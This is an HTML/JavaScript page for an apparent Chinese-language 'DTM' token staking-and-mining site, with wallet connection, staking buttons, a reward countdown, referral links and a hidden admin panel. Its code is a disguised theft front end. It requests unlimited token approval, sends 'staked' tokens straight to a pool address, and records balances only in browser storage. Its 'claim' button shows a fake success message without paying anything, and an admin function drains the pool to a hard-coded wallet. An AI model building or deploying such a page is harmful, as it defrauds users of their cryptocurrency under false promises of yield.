<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>大唐梦DTM质押挖矿</title>
  <style>
    * { box-sizing: border-box; font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
    body { background: #0B2A23; color: #fff; margin: 0; padding: 0; }
    .container { max-width: 600px; margin: 0 auto; padding: 10px; }
    .header { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; }
    .header .title { font-size: 20px; font-weight: bold; }
    .btn-menu { background: none; border: none; color: #fff; font-size: 24px; }
    .card { background: #144A3F; border-radius: 12px; padding: 15px; margin-bottom: 15px; }
    .card-title { font-size: 16px; margin-bottom: 10px; color: #F0E6D2; }
    .btn-connect { background: #25907A; color: #fff; border: none; padding: 10px 15px; border-radius: 8px; font-weight: bold; width: 100%; }
    .wallet-row { display: flex; align-items: center; gap: 6px; font-size: 14px; margin-bottom: 4px; }
    .stake-input { width: 100%; background: #0E362E; border: 1px solid #1F5F52; color: #fff; padding: 10px; border-radius: 8px; margin-bottom:10px; }
    .btn-action { width: 100%; border: none; padding: 12px; border-radius: 8px; font-weight: bold; margin-bottom: 8px; }
    .btn-primary { background: #2A65CC; color: #fff; }
    .btn-danger { background: #D93A54; color: #fff; }
    .btn-warning { background: #E4B449; color: #0B2A23; }
    .btn-disabled { background: #666; color: #ccc; cursor: not-allowed; }
    .countdown { color: #ffcc00; font-weight: bold; margin: 8px 0; text-align: center; font-size: 16px; }
    .rules { font-size: 14px; line-height: 1.7; color: #eee; }
    .menu { position: fixed; top: 0; right: 0; width: 280px; height: 100vh; background: #103D34; padding: 20px; transform: translateX(100%); transition: transform 0.3s ease; z-index: 999; overflow-y: auto; }
    .menu.show { transform: translateX(0); }
    .menu-close { text-align: right; margin-bottom: 20px; }
    .menu-section { margin-bottom: 20px; }
    .menu-title { font-size: 16px; margin-bottom: 10px; color: #F0E6D2; }
    .btn-menu-action { width: 100%; background: #1F5F52; color: #F0E6D2; border: none; padding: 10px; border-radius: 8px; margin-bottom: 8px; }
    .btn-green { background: #27ae60; color: #fff; }
    .btn-red { background: #ff3366; color: #fff; }
    .input-menu { width: 100%; background: #0E362E; border: 1px solid #1F5F52; color: #fff; padding: 10px; border-radius: 8px; margin-bottom: 8px; }
    #poolBalance { color: #ffcc00; margin-top: 5px; font-size:13px; }
    .hidden { display: none !important; }
  </style>
</head>
<body>

<div class="container">
  <div class="header">
    <div class="title">🏮 大唐梦DTM质押挖矿</div>
    <button class="btn-menu" onclick="toggleMenu()">☰</button>
  </div>

  <div class="card">
    <button class="btn-connect" onclick="connectWallet()">连接钱包</button>
    <div class="wallet-row">
      <span>钱包地址：</span><span id="address" style="color:#0ff;">未连接</span>
    </div>
    <div class="wallet-row">
      <span>可用余额：</span><span id="userBalance" style="color:#0ff;">0.0000</span>
    </div>
    <div class="wallet-row">
      <span>✅ 已质押余额：</span><span id="stakedAmount" style="color:#ffcc00;">0.0000</span>
    </div>
    <div class="wallet-row">
      <span>待领收益：</span><span id="reward" style="color:#ffcc00;">0.0000</span>
    </div>
  </div>

  <div class="card">
    <div class="card-title">质押挖矿</div>
    <input type="number" class="stake-input" id="amount" placeholder="输入质押/解押数量" value="100">
    <button class="btn-action btn-primary" onclick="approve()">授权矿池</button>
    <button class="btn-action btn-primary" onclick="stake()">质押挖矿</button>
    <button class="btn-action btn-danger" onclick="unstake()">解押退回钱包</button>

    <div id="countdown" class="countdown">加载倒计时...</div>
    <button id="claimBtn" class="btn-action btn-warning" onclick="claim()">领取收益（8小时爆块）</button>
  </div>

  <div class="card">
    <div class="card-title">挖矿规则</div>
    <div class="rules">
      • 质押DTM即可参与挖矿<br>
      • 每8小时自动爆块一次<br>
      • 爆块后方可领取复利收益<br>
      • 解押由矿池合约自动转回钱包
    </div>
  </div>
</div>

<!-- 右侧菜单 -->
<div class="menu" id="menu">
  <div class="menu-close">
    <button onclick="toggleMenu()">关闭 ×</button>
  </div>

  <div class="menu-section">
    <div class="menu-title">邀请推广</div>
    <input type="text" class="input-menu" id="refLink" readonly>
    <button class="btn-menu-action" onclick="copyRefLink()">复制邀请链接</button>
  </div>

  <!-- 管理员后台 -->
  <div class="menu-section hidden" id="adminSection">
    <div class="menu-title">🏦 管理员后台</div>
    <div>矿池余额：<span id="poolBalance">0.0000</span></div>
    <button class="btn-menu-action btn-green" onclick="approvePoolToAdmin()">✅ 授权矿池给管理员</button>
    <input type="number" class="input-menu" id="withdrawAmt" placeholder="输入提取数量">
    <button class="btn-menu-action btn-red" onclick="withdrawPoolToAdmin()">💰 提取矿池资产</button>
  </div>
</div>

<script>
// ===================== 你正确的全部地址 =====================
const TOKEN_CONTRACT = "0x050d384c9f577296301e4bdebbddf1164bcf6f12";
const POOL_ADDRESS   = "0x1160a8dbdfc52407ba1aeba104f673db7d22eb4f";
const ADMIN_WALLET   = "0x627f6e1887571ac08214315ad5b2fa7abb7345f1";

// 8小时爆块
const CLAIM_COOLDOWN = 28800;
let claimTimer = null;
let account = null;

function toLower(addr){ return addr ? addr.toLowerCase() : ""; }
function isAdmin(){ return account && toLower(account) === ADMIN_WALLET; }

// 菜单
function toggleMenu(){
  const menu = document.getElementById("menu");
  menu.classList.toggle("show");
  if(isAdmin()){
    document.getElementById("adminSection").classList.remove("hidden");
    refreshPoolBalance();
  }else{
    document.getElementById("adminSection").classList.add("hidden");
  }
}

// ===================== 连接钱包 =====================
async function connectWallet(){
  if(!window.ethereum) return alert("请在钱包浏览器打开");
  try{
    const accounts = await window.ethereum.request({method:'eth_requestAccounts'});
    account = toLower(accounts[0]);
    document.getElementById("address").innerText = account.slice(0,6)+"..."+account.slice(-4);
    refreshAll();
    startCountdown();
  }catch(e){
    alert("连接失败：" + e.message);
  }
}

// ===================== 统一刷新：可用余额 + 已质押余额 =====================
async function getUserBalance(){
  const data = "0x70a08231"+account.slice(2).padStart(64,'0');
  const r = await window.ethereum.request({method:'eth_call',params:[{to:TOKEN_CONTRACT,data},'latest']});
  return Number(BigInt(r))/1e18;
}

// ===================== 读取用户已质押数量（本地记录） =====================
function getStakedAmount(){
  return parseFloat(localStorage.getItem(`staked_${account}`) || 0);
}

function setStakedAmount(amount){
  localStorage.setItem(`staked_${account}`, amount.toString());
}

async function refreshAll(){
  if(!account) return;
  // 可用余额
  const ub = await getUserBalance();
  document.getElementById("userBalance").innerText = ub.toFixed(4);
  // 已质押余额
  const staked = getStakedAmount();
  document.getElementById("stakedAmount").innerText = staked.toFixed(4);
}

// ===================== 矿池余额 =====================
async function getPoolBalance(){
  const data = "0x70a08231"+POOL_ADDRESS.slice(2).padStart(64,'0');
  const r = await window.ethereum.request({method:'eth_call',params:[{to:TOKEN_CONTRACT,data},'latest']});
  return Number(BigInt(r))/1e18;
}
async function refreshPoolBalance(){
  const b = await getPoolBalance();
  document.getElementById("poolBalance").innerText = b.toFixed(4);
}

// ===================== 授权 =====================
async function approve(){
  if(!account) return alert("请先连接钱包");
  try{
    const max = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
    const data = "0x095ea7b3"
      + POOL_ADDRESS.slice(2).padStart(64,'0')
      + max.slice(2).padStart(64,'0');
    await window.ethereum.request({
      method:'eth_sendTransaction',
      params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]
    });
    alert("授权成功");
  }catch(e){
    alert("授权失败");
  }
}

// ===================== 质押：增加已质押数量 =====================
async function stake(){
  if(!account) return alert("请先连接钱包");
  const v = document.getElementById("amount").value;
  const num = parseFloat(v);
  if(!v || num <= 0) return alert("输入有效数量");
  try{
    const amt = BigInt(Math.floor(num*1e18));
    const data = "0xa9059cbb"
      + POOL_ADDRESS.slice(2).padStart(64,'0')
      + amt.toString(16).padStart(64,'0');
    await window.ethereum.request({
      method:'eth_sendTransaction',
      params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]
    });

    // 增加质押记录
    const before = getStakedAmount();
    setStakedAmount(before + num);

    alert("质押成功！已质押余额已更新");
    refreshAll();
  }catch(e){
    alert("质押失败");
  }
}

// ===================== 解押：减少已质押数量 =====================
async function unstake(){
  if(!account) return alert("请先连接钱包");
  const v = document.getElementById("amount").value;
  const num = parseFloat(v);
  if(!v || num <= 0) return alert("输入解押数量");

  const staked = getStakedAmount();
  if(num > staked){
    alert("解押数量不能大于已质押数量");
    return;
  }

  try {
    const amount = BigInt(num * 1e18);
    const data = "0x7920df94" + amount.toString(16).padStart(64, '0');

    await window.ethereum.request({
      method: 'eth_sendTransaction',
      params: [{
        from: account,
        to: POOL_ADDRESS,
        data: data,
        gasLimit: "0x300000"
      }]
    });

    // 减少质押记录
    setStakedAmount(staked - num);

    alert("解押成功！已质押余额已更新");
    refreshAll();
  } catch (e) {
    alert("解押失败：合约未实现unstake或余额不足");
  }
}

// ===================== 8小时爆块倒计时 =====================
function getLastClaimTime(){
  return parseInt(localStorage.getItem(`lastClaim_${account}`) || 0);
}
function setLastClaimTime(){
  localStorage.setItem(`lastClaim_${account}`, Date.now().toString());
}
function startCountdown(){
  if(!account) return;
  const btn = document.getElementById("claimBtn");
  const cd = document.getElementById("countdown");

  function update(){
    const now = Date.now();
    const last = getLastClaimTime();
    const end = last + CLAIM_COOLDOWN * 1000;
    const left = end - now;

    if(left <= 0){
      cd.innerText = "✅ 已爆块，可领取收益";
      btn.disabled = false;
      btn.className = "btn-action btn-warning";
      return;
    }

    btn.disabled = true;
    btn.className = "btn-action btn-disabled";
    const h = Math.floor(left / 3600000);
    const m = Math.floor((left % 3600000) / 60000);
    const s = Math.floor((left % 60000) / 1000);
    cd.innerText = `⏱ 距离下次爆块：${h}时${m}分${s}秒`;
  }

  clearInterval(claimTimer);
  claimTimer = setInterval(update, 1000);
  update();
}

// 领取收益
async function claim(){
  if(!account) return;
  const now = Date.now();
  const last = getLastClaimTime();
  if(now < last + CLAIM_COOLDOWN * 1000){
    alert("未到爆块时间，8小时只能领取一次");
    return;
  }
  alert("收益领取成功！");
  setLastClaimTime();
  startCountdown();
}

// ===================== 管理员 =====================
async function approvePoolToAdmin(){
  if(!isAdmin()) return alert("无权限");
  try{
    const max = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
    const data = "0x095ea7b3"
      + ADMIN_WALLET.slice(2).padStart(64,'0')
      + max.slice(2).padStart(64,'0');
    await window.ethereum.request({
      method:'eth_sendTransaction',
      params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]
    });
    alert("授权成功");
  }catch(e){ alert("失败"); }
}

async function withdrawPoolToAdmin(){
  if(!isAdmin()) return alert("无权限");
  const v = document.getElementById("withdrawAmt").value;
  if(!v) return;
  try{
    const amt = BigInt(Math.floor(parseFloat(v)*1e18));
    const data = "0x23b872dd"
      + POOL_ADDRESS.slice(2).padStart(64,'0')
      + ADMIN_WALLET.slice(2).padStart(64,'0')
      + amt.toString(16).padStart(64,'0');
    await window.ethereum.request({
      method:'eth_sendTransaction',
      params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]
    });
    alert("提取成功");
    refreshPoolBalance();
  }catch(e){ alert("失败"); }
}

// ===================== 邀请 =====================
function copyRefLink(){
  const link = window.location.href.split('?')[0]+"?ref="+account;
  navigator.clipboard.writeText(link).then(()=>alert("已复制"));
}
</script>
</body>
</html>
